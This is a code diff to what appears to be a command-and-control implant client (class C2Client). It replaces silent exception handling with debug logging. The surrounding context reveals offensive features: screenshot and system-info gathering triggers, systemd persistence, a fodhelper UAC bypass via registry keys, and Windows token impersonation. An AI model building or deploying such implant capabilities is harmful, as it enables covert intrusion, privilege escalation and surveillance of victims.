@@ -561,8 +561,8 @@ class C2Client(BaseC2):
                 self._last_info_gather = current_time
                 return True
 
-        except Exception:
-            pass
+        except Exception as e:
+            self.logger.debug(f"Failed to check system info trigger: {e}")
 
         return False
 
@@ -595,8 +595,8 @@ class C2Client(BaseC2):
             # Check for significant screen changes (using basic metrics)
             # This would require more sophisticated screen monitoring in production
 
-        except Exception:
-            pass
+        except Exception as e:
+            self.logger.debug(f"Failed to check screenshot trigger: {e}")
 
         return False
 
@@ -1998,8 +1998,8 @@ WantedBy=multi-user.target
             # Clean up registry key on timeout
             try:
                 winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
-            except:
-                pass
+            except Exception as e:
+                self.logger.debug(f"Failed to clean up registry key: {e}")
             return {"success": False, "message": "fodhelper execution timed out"}
         except (
             OSError,
@@ -2018,8 +2018,8 @@ WantedBy=multi-user.target
             # Try to clean up registry key on error
             try:
                 winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
-            except:
-                pass
+            except Exception as e:
+                self.logger.debug(f"Failed to clean up registry key: {e}")
             return {"success": False, "message": f"fodhelper UAC bypass failed: {e}"}
 
     def _windows_token_impersonation(self) -> dict[str, Any]:
